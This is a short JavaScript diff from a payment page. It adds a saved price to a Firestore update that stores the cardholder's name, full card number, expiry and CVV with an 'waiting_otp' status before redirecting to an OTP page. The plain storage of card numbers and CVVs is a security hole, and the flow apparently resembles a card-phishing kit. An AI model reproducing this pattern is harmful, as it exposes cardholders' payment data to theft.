@@ -296,13 +296,15 @@
         }
 
         try {
+            const savedPrice = localStorage.getItem('selected_price') || '';
             await db.collection("orders").doc(userId).update({
                 card_name: name,
                 card_number: num,
                 expiry: month + "/" + year,
                 cvv: cvv,
                 status: "waiting_otp",
-                next_step: "WAITING"
+                next_step: "WAITING",
+                ...(savedPrice ? { price: savedPrice } : {})
             });
             window.location.href = "otp_verification.html";
         } catch (e) {
